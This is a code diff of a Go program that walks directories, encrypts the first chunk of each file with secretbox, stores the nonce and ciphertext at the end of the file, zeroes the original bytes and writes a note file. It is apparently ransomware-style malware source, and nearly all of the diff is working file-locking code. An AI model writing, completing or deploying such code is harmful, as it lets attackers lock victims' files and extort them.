@@ -5,10 +5,11 @@ package main
  * Encrypt files
  * By J. Stuart McMurray
  * Created 20200411
- * Last Modified 20200413
+ * Last Modified 20221004
  */
 
 import (
+	"encoding/binary"
 	"errors"
 	"fmt"
 	"io"
@@ -20,6 +21,8 @@ import (
 
 	"golang.org/x/crypto/nacl/secretbox"
 )
+
+var zeros []byte
 
 // Encrypter encrypts a single file.  It's just a convenient way to pass data
 // to the walk function passed to filepath.Walk.
@@ -96,8 +99,6 @@ func (e Encrypter) Encrypt(path string, info os.FileInfo, err error) error {
 		)
 		return nil
 	}
-
-	/* Get the first chunk of the file to encrypt */
 	if _, err := f.Seek(0, os.SEEK_SET); nil != err {
 		log.Printf(
 			"[%s] Seeking to beginning for chunk read: %v",
@@ -106,61 +107,10 @@ func (e Encrypter) Encrypt(path string, info os.FileInfo, err error) error {
 		)
 		return nil
 	}
-	nr, err := io.ReadFull(f, e.Message)
-	if errors.Is(err, io.EOF) {
-		log.Printf("[%s] Empty file", f.Name())
-		return nil
-	}
-	if nil != err && !errors.Is(err, io.ErrUnexpectedEOF) {
-		log.Printf("[%s] Reading chunk to encrypt: %v", f.Name(), err)
-		return nil
-	}
 
-	/* Random nonce for this file */
-	if _, err := rand.Read(e.Nonce[:]); nil != err {
-		log.Printf(
-			"[%s] Error generating random nonce: %v",
-			f.Name(),
-			err,
-		)
-		return nil
-	}
-
-	/* Encrypt it */
-	e.Out = secretbox.Seal(e.Out[:0], e.Message[:nr], &e.Nonce, &e.Key)
-
-	/* Replace the chunk of the file we read and append the rest and
-	nonce. */
-	if _, err := f.Seek(0, os.SEEK_SET); nil != err {
-		log.Printf(
-			"[%s] Seeking to beginning for chunk write: %v",
-			f.Name(),
-			err,
-		)
-		return nil
-	}
-	if _, err := f.Write(e.Out[:nr]); nil != err {
-		log.Printf(
-			"[%s] Writing encrypted chunk: %v",
-			f.Name(),
-			err,
-		)
-		return nil
-	}
-	if _, err := f.Seek(0, os.SEEK_END); nil != err {
-		log.Printf(
-			"[%s] Seeking to end for chunk write: %v",
-			f.Name(),
-			err,
-		)
-		return nil
-	}
-	if _, err := f.Write(e.Out[nr : nr+secretbox.Overhead]); nil != err {
-		log.Printf("[%s] Appending overhead: %v", f.Name(), err)
-		return nil
-	}
-	if _, err := f.Write(e.Nonce[:]); nil != err {
-		log.Printf("[%s] Appendig nonce: %v", f.Name(), err)
+	/* Encrypt it. */
+	if err := e.EncryptFile(f); nil != err {
+		log.Printf("[%s] Error encrypting file: %s", f.Name(), err)
 		return nil
 	}
 
@@ -186,5 +136,49 @@ func (e Encrypter) WriteNote(d string) error {
 	if _, err := f.Write(FilledNoteTemplate); nil != err {
 		return fmt.Errorf("writing note: %w", err)
 	}
+	return nil
+}
+
+// EncryptFile encrypts f.
+func (e Encrypter) EncryptFile(f *os.File) error {
+	/* Get the first chunk of the file to encrypt */
+	nr, err := io.ReadFull(f, e.Message)
+	if errors.Is(err, io.EOF) {
+		return fmt.Errorf("empty file")
+	}
+
+	/* Random nonce for this file */
+	if _, err := rand.Read(e.Nonce[:]); nil != err {
+		return fmt.Errorf("generating nonce: %w", err)
+	}
+
+	/* Encrypt it */
+	e.Out = secretbox.Seal(e.Out[:0], e.Message[:nr], &e.Nonce, &e.Key)
+
+	/* Append the nonce, encrypted chunk, and encrypted chunk size to the
+	end. */
+	if _, err := f.Seek(0, os.SEEK_END); nil != err {
+		return fmt.Errorf("seeking to end of file: %w", err)
+	}
+	if _, err := f.Write(e.Nonce[:]); nil != err {
+		return fmt.Errorf("saving nonce: %w", err)
+	}
+	if _, err := f.Write(e.Out); nil != err {
+		return fmt.Errorf("saving encrypted chunk: %w", err)
+	}
+	var cl [8]byte
+	binary.BigEndian.PutUint64(cl[:], uint64(len(e.Out)))
+	if _, err := f.Write(cl[:]); nil != err {
+		return fmt.Errorf("saving encrypted chunk length: %w", err)
+	}
+
+	/* Zero out encrypted bytes. */
+	if len(zeros) < nr {
+		zeros = make([]byte, nr)
+	}
+	if _, err := f.WriteAt(zeros[:nr], 0); nil != err {
+		return fmt.Errorf("zeroing encrypted chunk: %w", err)
+	}
+
 	return nil
 }
